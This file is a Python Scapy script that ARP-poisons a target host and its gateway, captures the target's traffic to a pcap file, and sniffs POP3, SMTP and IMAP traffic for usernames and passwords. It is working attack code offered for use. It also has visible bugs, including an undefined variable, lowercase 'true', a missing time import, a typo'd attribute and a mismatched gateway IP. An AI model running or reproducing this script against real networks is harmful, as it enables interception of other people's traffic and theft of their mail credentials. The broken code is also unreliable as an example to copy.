from scapy.all import *
import os
import sys
import threading
import signal

interface =     "en1"
target_ip =     "192.168.0.27"
gateway_ip =    "182.168.0.1"
packet_count =  1000


#defining our interface
conf.iface = interface

#disable output
conf.verb = 0

def restore_target(gateway_ip, gateway_mac,target_ip,target_mac):
    print"[*] Restoring target..."
    send(ARP(op=2, psrc=gateway_ip,pdst=target_ip,hwdst="ff:ff:ff:ff:ff:ff:", hwsrc=gateway_mac), count=5)
    send(ARP(op=2, psrc=target_ip,pdst=gateway_ip,hwdst="ff:ff:ff:ff:ff:ff:", hwsrc=target_mac), count=5)

    # tells to the main thread to terminate
    os.kill(os.getpid(), signal.SIGINT)

def get_mac(ip_address):
    responses,unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address), timeout=2, retry=10)

    #return the MAC address from a response
    for s,r in responses:
        return r[Ether].src
    
    return None

def poison_target(gateway_ip, gateway_mac, target_ip, target_mac):
    poison_target = ARP()
    poison_target.op = 2
    poison_target.psrc = gateway_ip
    poison_target.pdst = target_ip
    poison_gateway.hwdst = target_mac

    poison_gateway = ARP()
    poison_gateway.op = 2
    poison_gateway_psrc = target_ip
    poison_gateway.pdst = gateway_ip
    poison_gateway.hwdst = gateway_mac

    print"[*]Beginning the ARP POISON.. [CRTL-C to STOP]"
    
    while true:
        try:
            send(poison_target)
            send(poison_gateway)
            time.sleep(2)
        except KeyboardInterrupt:
            restore_target(gateway_ip, gateway_mac, target_ip,target_mac)

    print"[*]ARP POISON attack finished."
    return




print"[*] Setting up %s" % interface

gateway_mac = get_mac(gateway_ip)

if gateway_mac is None:
    print"[!] FUCK! Failed to get gateway MAC... Aborting..."
    sys.exit(0)
else:
    print"[*] Gateway %s is at %s" %(gateway_ip, gateway_mac)

target_mac = get_mac(target_ip)
if target_mac is None:
    print"[!] FUCK! Failed to get target MAC... Aborting..."
    sys.exit(0)
else:
    print"[*] Target %s is at %s" %(target_ip, target_mac)

#Let's poisoning...
poison_thread = threading.Thread(target = poison_target,args=(gateway_ip,gateway_mac,target_ip,target_mac))
poison_thread.start()

try:
    print"[*] Starting sniffer for %d packets" % packet_count

    bpf_filter = "ip hosts %s" % target_ip
    packets = sniff(count=packet_count, filter=bpf_filter, iface=interface)

    #write the captured packets
    wrpcap('arper.pcap', packets)

    #restore network
    restore_target(gateway_ip, gateway_mac,target_ip, target_mac)

except KeyboardInterrupt:
    #restore network
    restore_target(gateway_ip, gateway_mac,target_ip, target_mac)
    sys.exit(0)


#callback for all the packages that match the filter
def packet_callback(packet):
    if packet[TCP].payload:
        mail_packet = str(packet[TCP].payload)
        if "user" in mail_packet.lower() or "pass" in mail_packet.lower():
            print"[*] SERVER: %s " % packet[IP].dst
            print"[*] %s " % packet[TCP].payload
    

#trigger the sniffer
sniff(filter="tcp port 110 or tcp port 25 or tcp port 143",prn=packet_callback,store=0)
